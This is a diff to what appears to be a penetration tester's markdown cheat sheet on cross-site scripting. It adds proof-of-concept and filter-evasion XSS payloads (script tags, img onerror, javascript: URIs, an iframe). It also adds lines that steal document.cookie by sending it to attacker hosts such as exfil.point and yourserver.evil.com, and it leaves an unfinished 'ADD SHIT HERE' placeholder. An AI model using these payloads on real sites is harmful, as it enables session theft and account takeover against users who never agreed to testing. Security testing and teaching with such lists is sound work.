@@ -616,10 +616,29 @@ window.location.reload()
 window.location.assign()
 ```
 
-**Standard Payloads ad Filter Evasion**
+**Standard Payloads**
 ```javascript
+/* PoC Payloads */
+<script>alert('hi')</script>
+<script>alert(document.cookie)</script>
+
+/* Filter Evasion Payloads */
+&lt;script&gt;alert(document.cookie)&lt;/script&gt;
+<img src=x onerror="alert(document.cookie)">
+<img src="javascript:alert('XSS');">
+<img src=javascript:alert('XSS')>
+<img src=javascript:alert(&quot;XSS&quot;)>
+<a onmouseover="alert(document.cookie)">click me</a>
+<input type="image" src="javascript:alert(document.cookie)"
+
+/* PoC Payloads */
 <script>document.write(“<img src=http://exfil.point/lol?”+document.cookie);</script>
-<script>document.write(“<img src=http://exfil.point/lol?”+document.cookie);</script>
+document.write('<img src="https://yourserver.evil.com/collect?cookie=' + document.cookie + '" />')
+```
+
+iframe
+```
+<iframe src="javascript:alert(0)"> 
 ```
 
 **CSP Bypass**  
@@ -640,6 +659,11 @@ Bypass via. JSONP API callback param:
 /* Note:
 Encoding needs to be performed twice as the initial POST request to the target server will decode it once, then another round of decoding will be performed upon the target's callback to your attacker url.
 */
+```
+
+**Filter Evasion**
+```
+ADD SHIT HERE
 ```
 
 ### ============================================================
